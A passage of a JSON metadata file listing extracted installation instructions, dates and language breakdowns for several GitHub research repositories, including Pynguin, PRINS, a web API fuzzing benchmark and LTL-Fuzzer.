of the individial snippets can be found in pkl files. **Note**: not all of these snippets have descriptions |\n \n",
                    "original_header": "Available snippet collections"
                },
                "confidence": 0.9999766764241858,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/nokia/codesearch/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2020-08-27T13:04:02Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2023-12-11T13:38:34Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Jupyter Notebook",
                    "name": "Jupyter Notebook",
                    "type": "Programming_language",
                    "size": 369066
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 128173
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "411": {
        "filename": "umangm_ziptrack_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/umangm/ziptrack",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2018-05-08T23:17:16Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2022-04-25T13:33:52Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Java",
                    "name": "Java",
                    "type": "Programming_language",
                    "size": 195717
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "C",
                    "name": "C",
                    "type": "Programming_language",
                    "size": 68835
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "C++",
                    "name": "C++",
                    "type": "Programming_language",
                    "size": 46761
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "JavaScript",
                    "name": "JavaScript",
                    "type": "Programming_language",
                    "size": 8689
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 6073
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Perl",
                    "name": "Perl",
                    "type": "Programming_language",
                    "size": 4991
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Makefile",
                    "name": "Makefile",
                    "type": "Programming_language",
                    "size": 987
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "HTML",
                    "name": "HTML",
                    "type": "Programming_language",
                    "size": 691
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "412": {
        "filename": "feldob_repro_autobva_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/feldob/repro_autobva",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "To run the scripts with an installation of Julia (e.g. verified version 1.5.3), you can execute the shell script stats.sh in directory `autobva` on a linux-based operating system: `./stats.sh`. \n"
                },
                "confidence": 0.9999994396892908,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/feldob/repro_autobva/master/readme.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2022-07-18T19:20:52Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2022-07-18T20:00:23Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Julia",
                    "name": "Julia",
                    "type": "Programming_language",
                    "size": 19854
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 94
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "413": {
        "filename": "HadiJahanshahi_WaybackMachine_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/HadiJahanshahi/WaybackMachine",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2020-10-26T16:04:19Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2022-03-15T02:43:18Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 164540
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "414": {
        "filename": "rashidzaman84_MemoryEfficientOCC_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/rashidzaman84/MemoryEfficientOCC",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": " - Download the code to your local machine.\n - Run the \"UITopia (MAOCC_States).launch\". Let the code to download all the required ProM packages on the first run.\n - Load your event log and the reference process model in the displayed window and run the plugin \"01 Compute Prefix Alignments - With Bounded States\" with these inputs.\n - The next window requires as input the state limit.\n - The results are displayed on the console.\n\n",
                    "type": "Text_excerpt",
                    "original_header": "Installation",
                    "parent_header": [
                        "Memory Efficient Online Conformance Checking"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/rashidzaman84/MemoryEfficientOCC/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2021-12-23T14:42:36Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2022-01-03T15:44:43Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Java",
                    "name": "Java",
                    "type": "Programming_language",
                    "size": 38775
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "415": {
        "filename": "JetBrains-Research_anti-copy-paster_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/JetBrains-Research/anti-copy-paster",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "AntiCopyPaster requires IntelliJ IDEA of version 2022.3 to work. To install the plugin:\n\n1. Download the pre-built version of the plugin from [here](https://drive.google.com/file/d/1ULBHbUmoiM3qE-qxomSYzWVlu7aiaqZc/view?usp=share_link);\n2. Open IntelliJ IDEA and go to `File`/`Settings`/`Plugins`;\n3. Select the gear icon, and choose `Install Plugin from Disk...`;\n4. Choose the downloaded ZIP archive;\n5. Click `Apply`;\n6. Restart the IDE.\n",
                    "type": "Text_excerpt",
                    "original_header": "How to install",
                    "parent_header": [
                        "AntiCopyPaster"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/JetBrains-Research/anti-copy-paster/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2019-10-21T14:28:14Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-07-02T09:56:44Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Java",
                    "name": "Java",
                    "type": "Programming_language",
                    "size": 48002
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "PureBasic",
                    "name": "PureBasic",
                    "type": "Programming_language",
                    "size": 17244
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Kotlin",
                    "name": "Kotlin",
                    "type": "Programming_language",
                    "size": 1785
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "416": {
        "filename": "uDEVOPS2020_Replication-package-Reasoning-Based-Software-Testing_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/uDEVOPS2020/Replication-package-Reasoning-Based-Software-Testing",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2023-01-19T13:59:09Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2023-08-01T12:56:08Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 1133940
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 9129
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "417": {
        "filename": "se2p_pynguin_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/se2p/pynguin",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "Pynguin can be easily installed using the `pip` tool by typing:\n```bash\npip install pynguin\n```\n\nMake sure that your version of `pip` is that of a supported Python version, as any \nolder version is not supported by Pynguin!\n",
                    "type": "Text_excerpt",
                    "original_header": "Installing Pynguin",
                    "parent_header": [
                        "Pynguin"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/se2p/pynguin/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Pynguin is a command-line application.\nOnce you installed it to a virtual environment, you can invoke the tool by typing\n`pynguin` inside this virtual environment.\nPynguin will then print a list of its command-line parameters. \nA minimal full command line to invoke Pynguin could be the following,\nwhere we assume that a project `foo` is located in `/tmp/foo`,\nwe want to store Pynguin's generated tests in `/tmp/testgen`,\nand we want to generate tests using a whole-suite approach for the module `foo.bar`\n(wrapped for better readability):\n```bash\npynguin \\\n  --project-path /tmp/foo \\\n  --output-path /tmp/testgen \\\n  --module-name foo.bar\n```\nPlease find a more detailed example in the [quick start guide](https://pynguin.readthedocs.io/en/latest/user/quickstart.html). \n",
                    "original_header": "Using Pynguin"
                },
                "confidence": 0.9812892529172652,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/se2p/pynguin/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2020-07-27T15:50:19Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-10-01T09:10:36Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 1943012
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Makefile",
                    "name": "Makefile",
                    "type": "Programming_language",
                    "size": 2984
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Dockerfile",
                    "name": "Dockerfile",
                    "type": "Programming_language",
                    "size": 2645
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "HTML",
                    "name": "HTML",
                    "type": "Programming_language",
                    "size": 2471
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 2246
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "418": {
        "filename": "95616ARG_sifter_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/95616ARG/sifter",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2020-09-15T02:34:01Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2021-11-26T01:03:41Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 114395
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "C++",
                    "name": "C++",
                    "type": "Programming_language",
                    "size": 11602
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Starlark",
                    "name": "Starlark",
                    "type": "Programming_language",
                    "size": 3584
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "419": {
        "filename": "SNTSVV_PRINS_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/SNTSVV/PRINS",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "Firstly, to render generated models in PDF, you must install `dot`. \nTry the following command to check if `dot` is installed:\n```shell script\ndot -V\n```\n\nIf `dot` is not installed, you can install it by following [this page](https://www.graphviz.org/download/).\nOn Windows, you can follow the [installation procedure](https://forum.graphviz.org/t/new-simplified-installation-procedure-on-windows/224).\n\nSecond, initialize python's virtual environment & install required packages:\n```shell script\npython3 -m venv venv\nsource venv/bin/activate  # venv should be activated during the execution of PRINS\npip install -r requirements.txt\n```\n\nFinally, you must have JDK to run MINT, which is used as a backend for PRINS. \nTry the following command to check if JDK is installed:\n```shell script\njava -version\n```\n\nIf JDK is not installed, you can install it by following [this page](https://openjdk.org/install/).\n",
                    "type": "Text_excerpt",
                    "original_header": "Install",
                    "parent_header": [
                        "PRINS: Scalable Model Inference for Component-based System Logs"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/SNTSVV/PRINS/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "You can simply run the following script:\n```shell script\n(venv) python check_dataset_summary.py\n``` \n",
                    "original_header": "Dataset Check"
                },
                "confidence": 0.9997507650405713,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/SNTSVV/PRINS/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "You can run the unit tests:\n```shell script\ncd PRINS\n(venv) python -m unittest\n``` \n",
                    "original_header": "Unit Tests"
                },
                "confidence": 0.9945206931247464,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/SNTSVV/PRINS/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "```shell script\n(venv) PROMPT PRINS-expr % python run_model_inference.py -h\nusage: run_model_inference.py [-h] [-s SYSTEM] [-n NUM_LOGS] [--prins_only]\n                              [--mint_sys_only] [-d DUPLICATE_RANGE]\n                              [-r REPETITIONS]\n\noptional arguments:\n  -h, --help            show this help message and exit\n  -s SYSTEM, --system SYSTEM\n                        System name (default=None)\n  -n NUM_LOGS, --num_logs NUM_LOGS\n                        Number of logs (default=all)\n  --prins_only          Specify this to run PRINS only\n  --mint_sys_only       Specify this to run MINT-SYS only\n  -d DUPLICATE_RANGE, --duplicate_range DUPLICATE_RANGE\n                        Input log duplication factor range 'from,to'\n                        (default='1,1')\n  -r REPETITIONS, --repetitions REPETITIONS\n                        Number of repetitions (default=1)\n```\n \n",
                    "original_header": "Execution Time Evaluation (RQ1, RQ2, RQ4)"
                },
                "confidence": 0.999999674810677,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/SNTSVV/PRINS/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "```shell script\n(venv) PROMPT PRINS-expr % python run_k_folds_cv.py -h\nusage: run_k_folds_cv.py [-h] [-k NUM_FOLDS] [-n NUM_LOGS] system technique\n\npositional arguments:\n  system                System name (e.g., Hadoop)\n\noptional arguments:\n  -h, --help            show this help message and exit\n  -k NUM_FOLDS, --num_folds NUM_FOLDS\n                        Number of folds\n  -n NUM_LOGS, --num_logs NUM_LOGS\n                        Number of logs (default: all)\n```\n \n",
                    "original_header": "Accuracy Evaluation (RQ3, RQ5)"
                },
                "confidence": 0.9570649168023051,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/SNTSVV/PRINS/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Run the script (note that the experimental results must be provided in `/expr_output`; by default, the results reported in the paper are given):\n```shell script\n(venv) python run_analyze_results.py\n``` \n",
                    "original_header": "Result Data Analysis"
                },
                "confidence": 0.9261053076600447,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/SNTSVV/PRINS/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2021-06-03T14:53:17Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-08-20T08:26:50Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 168874
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "420": {
        "filename": "beyondacm_Code2Que_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/beyondacm/Code2Que",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "*Code2Que* can be accessed at (new domain!):  \nhttp://www.code2que.com/  \nhttp://13.210.12.204:8080.  \ndataset can be accessed with:  \nhttps://zenodo.org/record/3942027#.Xwx6GJMzY1J   \n",
                    "original_header": "*Code2Que*: A Tool for Improving Question Titles from Mined Code Snippets in Stack Overflow"
                },
                "confidence": 0.9829776289829693,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/beyondacm/Code2Que/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2020-05-08T06:21:22Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2023-03-16T12:23:39Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 85649
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "421": {
        "filename": "withoutboats_shifgrethor_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/withoutboats/shifgrethor",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "[tracing]: https://en.wikipedia.org/wiki/Tracing_garbage_collection\n[precise]: https://en.wikipedia.org/wiki/Tracing_garbage_collection#Precise_vs._conservative_and_internal_pointers\n \n",
                    "original_header": "Interior mutability"
                },
                "confidence": 0.9998920450984821,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/withoutboats/shifgrethor/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2018-10-05T16:04:07Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-14T08:04:35Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Rust",
                    "name": "Rust",
                    "type": "Programming_language",
                    "size": 45255
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "422": {
        "filename": "schemathesis_web-api-fuzzing-project_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/schemathesis/web-api-fuzzing-project",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "WAFP is built around Docker and is tested against the `20.10.0` version. Check [the official Docker docs](https://docs.docker.com/get-docker/) for installation guide.\nOther dependencies are managed via `poetry` (check out the [installation guide](https://github.com/sdispater/poetry#installation)):\n\n```\npoetry install\n```\n\nIt also automatically installs WAFP CLI to the current environment that is available via the `wafp` entry point.\n",
                    "type": "Text_excerpt",
                    "original_header": "Installation",
                    "parent_header": [
                        "Web API Fuzzing Project (WAFP)"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/schemathesis/web-api-fuzzing-project/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "You can run targets with the following command (replace `<target-name>` with any target name from the catalog):\n```\npython -m wafp.targets <target-name> --output-dir=./artifacts\n```\n \n",
                    "original_header": "Fuzzing targets"
                },
                "confidence": 0.997937389640774,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/schemathesis/web-api-fuzzing-project/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Here is an example of the `httpbin` target:\n```python\nfrom wafp.targets import BaseTarget, Metadata\n\n\nclass Default(BaseTarget):\n    def get_base_url(self) -> str:\n        # A common case that has no additional path\n        return f\"http://0.0.0.0:{self.port}/\"\n\n    def get_schema_location(self) -> str:\n        return f\"http://0.0.0.0:{self.port}/spec.json\"\n\n    def is_ready(self, line: bytes) -> bool:\n        return b\"Listening at: \" in line\n\n    def get_metadata(self) -> Metadata:\n        return Metadata.flasgger(\n            flask_version=\"1.0.2\",\n            flasgger_version=\"0.9.0\",\n            openapi_version=\"2.0\",\n            validation_from_schema=False,\n        )\n```\nDocker-compose:\n```\nversion: '3'\nservices:\n  web:\n    build:\n      context: https://github.com/postmanlabs/httpbin.git#f8ec666b4d1b654e4ff6aedd356f510dcac09f83\n    init: true\n    environment:\n      - PORT=3000\n    ports:\n      - '${PORT-3000}:80'\n```\n \nCompose files should support the `PORT` environment variable and provide a proper port mapping. \nRunning the target from the example above:\n```python\ntarget = Default()\ntarget.start()\n# ... Run fuzzing ...\ntarget.stop()\ntarget.cleanup()\n```\nSome targets may require additional actions to be prepared for fuzzing, for example, creating a user and getting credentials.\nYou can extract headers from `docker-compose` output via the `get_headers` method:\n```python\nimport re\n...\n\nclass Default(BaseTarget):\n    ...\n    def get_headers(self, line: bytes) -> Dict[str, str]:\n        match = re.search(b\"token=(.+)\", line)\n        if match is None:\n            return {}\n        token = match.groups()[0]\n        return {\"Authorization\": f\"token {token.decode()}\"}\n```\nCredentials can be obtained in the `after_start` hook. At this moment, the target is ready to accept network requests:\n```python\nimport requests\n...\n\nclass Default(BaseTarget):\n    ...\n    def after_start(self, stdout: bytes, headers: Dict[str, str]) -> None:\n        base_url = self.get_base_url()\n        # Authorize & get the token\n        response = requests.post(\n            f\"{base_url}/authorizations/token\",\n            json={\"username\": \"root\", \"password\": \"test\"}\n        )\n        token = response.json()[\"token\"]\n        headers[\"Authorization\"] = f\"token {token}\"\n```\n \n",
                    "original_header": "Target structure"
                },
                "confidence": 0.9953462851426601,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/schemathesis/web-api-fuzzing-project/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Some targets provide Sentry integration, and it is possible to collect all errors reported during a fuzzing run.\nTo enable the integration, you need to pass the `sentry_dsn` argument during the target initialization or provide the `--sentry-dsn` CLI option.\nTo collect errors from the used Sentry instance you need to provide more info:\n```python\n# Target initialization\ntarget = target.Default(\n    sentry_dsn=\"https://c4715cd284cf4f509c32e49f27643f30@sentry.company.com/42\"\n)\n# Load all artifacts including errors reported to Sentry\nartifacts = target.collect_artifacts(\n    # Your Sentry instance base URL\n    sentry_url=\"https://sentry.company.com\",\n    # Sentry access token\n    sentry_token=\"7a7d025aafe34326b789356b62d2b6dc01af594c33ca48a3a0f76421a137ef9a\",\n    # The slug of the organization the target project belongs to\n    sentry_organization=\"my_org\",\n    # The slug of the project\n    sentry_project=\"target\",\n)\n```\n \nWAFP uses the `GET /api/0/projects/{organization_slug}/{project_slug}/events/` endpoint to retrieve events data.\nSee more info in Sentry documentation - https://docs.sentry.io/api/events/list-a-projects-events/ \nIf you'd like to use the `run.py` file to run all combinations, you'll need to add `sentry_dsn` keys to the desired combinations in the `COMBINATIONS` variable in the `run.py` file. \nAs Sentry does not process events immediately, you'll need to download them separately, when the processing is done in your Sentry instance. \nTo load the events you need the latest stable Rust version (see the [rustup](https://rustup.rs/) docs for the installation instructions) and run the following command in the `sentry_events` directory:\n```\ncargo run --release <path-to-artifacts> --token <your Sentry API token> --url <your Sentry instance URL>\n```\n \n",
                    "original_header": "Sentry integration"
                },
                "confidence": 0.9776269021657399,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/schemathesis/web-api-fuzzing-project/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "To process the artifacts you need the latest stable Rust version (see the [rustup](https://rustup.rs/) docs for the installation instruction). \nRun the following command in the `postprocessing` directory:\n```\ncargo run --release <path-to-artifacts> <output-directory>\n```\n \n- `metadata.json`. Metadata about a test run - tested fuzzer name, run duration, etc\n- `fuzzer.json` - Structured fuzzer output\n- `deduplicated_cases.json` - Deduplicated reported failures, when fuzzers provide it\n- `sentry.json` - Cleaned Sentry events for this run\n- `target.json` - Parsed stdout for Gitlab & Disease.sh targets that are tested without Sentry integration\n \n",
                    "original_header": "Artifacts processing"
                },
                "confidence": 0.9999522791701622,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/schemathesis/web-api-fuzzing-project/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2021-04-04T17:35:40Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2023-11-19T23:53:48Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 175395
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Rust",
                    "name": "Rust",
                    "type": "Programming_language",
                    "size": 84092
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Dockerfile",
                    "name": "Dockerfile",
                    "type": "Programming_language",
                    "size": 20420
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 2104
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "423": {
        "filename": "ltlfuzzer_LTL-Fuzzer_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/ltlfuzzer/LTL-Fuzzer",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "* Install basic dependencies:\n```\n   sudo apt install -y build-essential make cmake ninja-build git binutils-gold binutils-dev curl wget\n```\n\n* Install Boost 1.71:\n```\n   sudo apt install libboost-all-dev libboost-dev\n```\n\n* Install LLVM 11.0.0 with Gold-plugin(can refer to this [building script](./scripts/build-llvm-11.sh). After that, please copy the following libraries into the specified location:\n```\n   sudo cp /usr/lib/llvm-11/lib/libLTO.so /usr/lib/bfd-plugins/\n   sudo cp /usr/lib/llvm-11/lib/LLVMgold.so /usr/lib/bfd-plugins/ \n```\n* Install spot 2.9.7. You could also follow thses [instructions](https://spot.lrde.epita.fr/install.html).\n  \n```\n   wget -q -O - https://www.lrde.epita.fr/repo/debian.gpg | sudo apt-key add -\n   sudo echo 'deb http://www.lrde.epita.fr/repo/debian/ stable/' >> /etc/apt/sources.list\n   sudo apt update\n   sudo apt install -y spot libspot-dev libgtest-dev\n```\n* Install Python3 and related modules:\n\n```\n   sudo install python3 python3-dev python3-pip\n   sudo pip3 install --upgrade pip\n   sudo pip3 install networkx pydot pydotplus\n```\n",
                    "type": "Text_excerpt",
                    "original_header": "Installing dependencies",
                    "parent_header": [
                        "Building"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/ltlfuzzer/LTL-Fuzzer/main/README.md"
            },
            {
                "result": {
                    "value": "* Clone LTL-Fuzzer and them compile as follows: \n```\n  cd LTL-Fuzzer \n  mkdir build\n  cd build\n  cmake ../\n  make\n  cd ../AFLGo\n  make \n  cd llvm-mode\n  make\n  cd ../distance_calculator\n  cmake -G Ninja ./\n  cmake --build ./\n```",
                    "type": "Text_excerpt",
                    "original_header": "Installing LTL-Fuzzer",
                    "parent_header": [
                        "Building"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/ltlfuzzer/LTL-Fuzzer/main/README.md"
            },
            {
                "result": {
